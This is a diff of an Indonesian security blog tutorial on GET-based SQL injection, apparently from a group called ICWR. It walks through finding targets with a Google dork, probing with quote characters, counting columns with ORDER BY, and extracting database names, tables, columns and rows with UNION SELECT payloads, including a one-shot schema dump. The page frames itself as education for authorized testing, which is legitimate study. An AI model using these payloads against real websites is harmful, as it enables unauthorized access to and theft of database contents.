@@ -14,7 +14,7 @@
 <meta property="og:description" content="Disclaimer:Disclaimer ini disengaja ditempatkan di bagian atas agar dibaca terlebih dahulu. Tujuan dari pembelajaran berikut adalah untuk keperluan pembelajaran dan peningkatan keamanan pada website s">
 <meta property="og:locale" content="id_ID">
 <meta property="article:published_time" content="2024-01-18T13:08:48.000Z">
-<meta property="article:modified_time" content="2024-01-18T14:05:48.281Z">
+<meta property="article:modified_time" content="2024-01-18T14:40:12.086Z">
 <meta property="article:author" content="R&amp;D ICWR">
 <meta property="article:tag" content="In Crust We Rush, Science, Social, Technology, BrotherHood">
 <meta name="twitter:card" content="summary">
@@ -158,39 +158,61 @@
 <p>SQL injection merupakan teknik serangan keamanan yang memanfaatkan celah pada sistem pengolahan query SQL pada aplikasi web. Pada serangan ini, penyerang menginjeksikan perintah SQL berbahaya ke dalam input aplikasi. Jika aplikasi tidak melakukan validasi atau penyaringan input dengan benar, perintah SQL tersebut dapat dieksekusi oleh database. Salah satu bentuk umum serangan SQL injection terjadi melalui metode GET dalam protokol HTTP, di mana parameter URL dapat dimanipulasi untuk menyisipkan perintah SQL yang membahayakan integritas data atau memungkinkan akses yang tidak sah.</p>
 <p>Sebagai contoh, URL yang rentan terhadap SQL injection pada metode GET adalah seperti: <code>http://contoh.com/login.php?username=admin&#39; OR &#39;1&#39;=&#39;1&#39; -- &amp;password=abc</code>. Dalam contoh ini, penyerang mencoba menyisipkan perintah SQL yang selalu benar, sehingga mengakibatkan akses ke seluruh data dari tabel yang bersangkutan. Untuk menjaga keamanan aplikasi dari serangan SQL injection, sangat penting untuk memvalidasi dan membersihkan input, serta menggunakan teknik parameterized queries atau prepared statements dalam pengolahan query SQL. Pengujian keamanan secara berkala juga diperlukan untuk memastikan tingkat keamanan aplikasi tetap terjaga.</p>
 <hr>
-<p>Proses pencarian target website yang menggunakan parameter GET untuk menampilkan data dapat dilakukan dengan menggunakan query dork Google, contohnya dengan <code>inurl:&quot;*.php?id=&quot;</code>. Setelah menemukan website target, seperti <code>http://contoh.com/get_name?id=1</code>, pengeksploitasian webnya dimulai dengan menambahkan karakter <code>&#39;</code> atau <code>&quot;</code> pada bagian paling belakang URL, misalnya: <code>http://contoh.com/get_name?id=1&#39;</code> atau <code>http://contoh.com/get_name?id=1&quot;</code>. Jika muncul error pada website, seperti <code>Warning: mysqli_num_rows() expects</code> dan sejenisnya, dapat disimpulkan bahwa website tersebut rentan terhadap SQL injection.</p>
-<p>Setelah mengidentifikasi website yang vulner, penyerang dapat menambahkan karakter balancing seperti <code>--</code> (untuk MySQL Linux Style), <code>--+</code> (untuk MySQL Windows Style), <code>#</code> ( untuk Hash URL Encode while Use), <code>--+-</code> (SQL Comment), <code>;%00</code> (Null Byte), atau <em>Backtick</em> untuk memperoleh respons yang diinginkan. Proses selanjutnya melibatkan penyuntikan query untuk mengetahui jumlah kolom pada table database, contohnya:</p>
+<p>Pertama-tama, dalam melakukan penetrasi keamanan pada website, fokus utama adalah mencari target yang menggunakan parameter GET untuk menampilkan data. Pendekatan yang umum dilakukan adalah dengan memanfaatkan query Dork pada mesin pencari Google menggunakan sintaks <code>inurl:&quot;*.php?id=</code>.</p>
+<p>Contohnya pada kolom search Google sebagai berikut:</p>
+<p><code>inurl:&quot;*.php?id=&quot;</code></p>
+<p>Setelah berhasil menemukan website target, seperti contoh <code>http://contoh.com/get_name?id=1</code>, langkah selanjutnya adalah melakukan eksploitasi untuk mengidentifikasi potensi kerentanannya terhadap serangan SQL Injection. Pendekatan ini dilakukan dengan memeriksa respons dari server terhadap manipulasi parameter GET.</p>
+<p>Untuk menguji kerentanan, tambahkan karakter <code>&#39;</code> atau <code>&quot;</code> pada bagian paling belakang URL, seperti:</p>
+<p><code>http://contoh.com/get_name?id=1&#39;</code></p>
+<p>atau</p>
+<p><code>http://contoh.com/get_name?id=1&quot;</code></p>
+<p>Jika website merespon dengan error seperti <code>Warning: mysqli_num_rows() expects</code>, kemungkinan besar website tersebut rentan terhadap serangan SQL Injection. Kesalahan ini menunjukkan bahwa input yang diberikan tidak diproses atau disaring dengan benar sebelum dieksekusi oleh database.</p>
+<p>Setelah mengidentifikasi kerentanan, langkah selanjutnya adalah menentukan jenis database yang digunakan oleh website dan menyesuaikan teknik serangan. Ini dapat dilakukan dengan menambahkan karakter balancing pada URL, seperti:</p>
+<ul>
+<li><code>--</code> untuk MySQL Linux Style</li>
+<li><code>--+</code> untuk MySQL Windows Style</li>
+<li><code>#</code> hash URL Encode while Use</li>
+<li><code>--+-</code> SQL Comment</li>
+<li><code>;%00</code> Null Byte</li>
+<li><code>/backtick</code> backtick</li>
+</ul>
+<p>Contoh:</p>
+<p><code>http://contoh.com/get_name?id=1&#39; --+-</code></p>
+<p>Langkah ini dilakukan untuk mengidentifikasi apakah teknik serangan SQL Injection yang digunakan sesuai dengan karakteristik server dan database yang dimiliki oleh website target. Penting untuk dicatat bahwa pengetesan keamanan seperti ini hanya boleh dilakukan dengan izin yang sah dan etika hacker yang baik.</p>
+<p>Setelah mengidentifikasi website yang vulner, penyerang dapat menambahkan karakter balancing seperti <code>--</code> (untuk MySQL Linux Style), <code>--+</code> (untuk MySQL Windows Style), <code>#</code> ( untuk Hash URL Encode while Use), <code>--+-</code> (SQL Comment), <code>;%00</code> (Null Byte), atau <em>Backtick</em> untuk memperoleh respons yang diinginkan.</p>
+<p>Langkah selanjutnya dalam proses eksploitasi melibatkan penyuntikan query dengan tujuan mengetahui jumlah kolom pada tabel database. Contohnya, penyerang dapat menggunakan pendekatan berurutan pada parameter GET, seperti:</p>
 <ul>
 <li><code>http://contoh.com/get_name?id=1&#39; order by 1--+-</code> -&gt; Tidak ada error</li>
 <li><code>http://contoh.com/get_name?id=1&#39; order by 2--+-</code> -&gt; Tidak ada error</li>
 <li><code>http://contoh.com/get_name?id=1&#39; order by 3--+-</code> -&gt; Tidak ada error</li>
-<li><code>http://contoh.com/get_name?id=1&#39; order by 4--+-</code> -&gt; Terjadi error, menandakan jumlah kolom pada table database adalah 3</li>
+<li><code>http://contoh.com/get_name?id=1&#39; order by 4--+-</code> -&gt; Terjadi error, menandakan jumlah kolom pada tabel database adalah 3</li>
 </ul>
-<p>Selanjutnya, penyerang menggunakan query untuk menampilkan posisi kolom pada table database, contohnya:</p>
+<p>Setelah mendapatkan informasi tentang jumlah kolom, penyerang dapat melanjutkan dengan mengidentifikasi letak kolom pada tabel database. Langkah ini dapat dilakukan dengan menggunakan query seperti:</p>
 <ul>
 <li><code>http://contoh.com/get_name?id=1&#39; union select 1,2,3--+-</code></li>
 </ul>
-<p>Website akan menampilkan angka 1, 2, dan 3 sesuai posisi kolom dalam table database, yang nantinya akan digunakan untuk menampilkan output hasil eksekusi query. Setelah mengetahui posisi yang diinginkan, penyerang bisa mengeksekusi query yang diinginkan pada posisi tersebut, misalnya menampilkan nama database dengan query:</p>
+<p>Website akan menampilkan angka 1, 2, dan 3 sesuai dengan posisi kolom dalam tabel database. Informasi ini nantinya digunakan untuk menyusun query akhir yang akan dieksekusi pada posisi yang diinginkan. Sebagai contoh, untuk menampilkan nama database, penyerang dapat menggunakan query seperti:</p>
 <ul>
 <li><code>http://contoh.com/get_name?id=-1&#39; union select 1,database(),3--+-</code></li>
 </ul>
-<p>Query untuk menampilkan table pada database adalah sebagai berikut:</p>
+<p>Dengan demikian, pemahaman mendalam tentang SQL Injection dan penggunaan teknik eksploitasi yang cermat menjadi kunci dalam melangkah maju dalam mengeksploitasi kerentanan keamanan pada website. Penting untuk dicatat bahwa kegiatan ini harus dilakukan dengan etika dan izin yang sah, serta bertujuan untuk pemahaman lebih lanjut dan peningkatan keamanan secara keseluruhan.</p>
+<p>Pada tahap selanjutnya eksploitasi SQL Injection setelah mendapatkan informasi ini, penyerang dapat melangkah lebih jauh dengan mengekstrak nama-nama tabel pada database target. Dengan menggunakan query berikut, penyerang dapat mengumpulkan nama-nama tabel tersebut:</p>
 <ul>
 <li><code>http://contoh.com/get_name?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+-</code></li>
 </ul>
-<p>Setelah mendapatkan nama-nama table pada database, langkah selanjutnya adalah menampilkan isi kolom pada table tersebut. Dengan menggunakan query berikut, nama table diubah menjadi bentuk hexa yang diawali dengan <code>0x</code>:</p>
+<p>Selanjutnya, setelah berhasil mendapatkan daftar nama-nama tabel, penyerang melanjutkan dengan mengekstrak isi kolom pada tabel-tabel tersebut. Dalam tahapan ini, nama tabel diubah menjadi format heksadesimal yang diawali dengan <code>0x</code>:</p>
 <ul>
 <li><code>http://contoh.com/get_name?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x6e616d615f746162656c --+-</code></li>
 </ul>
-<p>Atau menggunakan metode Dump in One Shot SQL Injection:</p>
+<p>Atau dengan menggunakan metode Dump in One Shot SQL Injection:</p>
 <ul>
-<li><code>http://contoh.com/get_name?id=-1&#39; union select 1,concat(0x3c623e44756d7020696e204f6e652053686f743c2f623e3c62723e,version(),0x3c62723e,user(),0x3c62723e,database(),0x3c62723e,@c:=0x00,if((select count(*) from information_schema.columns where table_schema not like 0x696e666f726d6174696f6e5f736368656d61 and @c:=concat(@c,0x3c62723e,table_name,0x2e,column_name)),0x00,0x00),@c),3--+-</code></li>
+<li><code>http://contoh.com/get_name?id=-1&#39; union select 1,concat(0x3c623e44756d7020696e204f6e652053686f743c2f623e3c62723e,version(),0x3c62723e,user(),0x3c62723e,database(),0x3c62723e,@c:=0x00,if((select count(*) from information_schema.columns where table_schema not like 0x696e666f726d6174696f6e5f736368656d61 and @c:=concat(@c,0x3c62723e,table_name,0x2e,column_name)),0x00,0x00),@c),3--+-&#39;</code></li>
 </ul>
-<p>Setelah mendapatkan nama kolom dari tabel, proses terakhir adalah menampilkan isi dari kolom pada table database. Misalnya, jika nama kolom ada 3 yaitu id, judul, detail, query untuk menampilkan isi dari kolom-kolom tersebut adalah:</p>
+<p>Dengan mendapatkan nama-nama kolom dari tabel, langkah terakhir adalah menampilkan isi dari kolom-kolom tersebut. Contoh query untuk menampilkan isi kolom pada tabel yang memiliki 3 kolom seperti id, judul, dan detail adalah:</p>
 <ul>
 <li><code>http://contoh.com/get_name?id=-1&#39; union select 1,group_concat(id,judul,detail),3 from nama_tabel --+-</code></li>
 </ul>
-<p>Dengan langkah-langkah tersebut, penyerang dapat berhasil mengeksploitasi dan mendapatkan akses tidak sah ke dalam database suatu aplikasi.</p>
+<p>Melalui serangkaian langkah kompleks ini, penyerang dapat berhasil mengeksploitasi dan memperoleh akses tidak sah ke dalam database suatu aplikasi. Penting untuk diingat bahwa praktek-praktek ini hanya dapat digunakan untuk pembelajaran dan pengujian keamanan dengan izin yang sah, dengan tujuan untuk meningkatkan keamanan aplikasi. Etika dan tanggung jawab dalam penggunaan teknik-teknik ini sangat ditekankan untuk mencegah penyalahgunaan.</p>
 <p>Penulis: Afrizal F.A</p>
 <hr>
 <p><em>Referensi:</em></p>
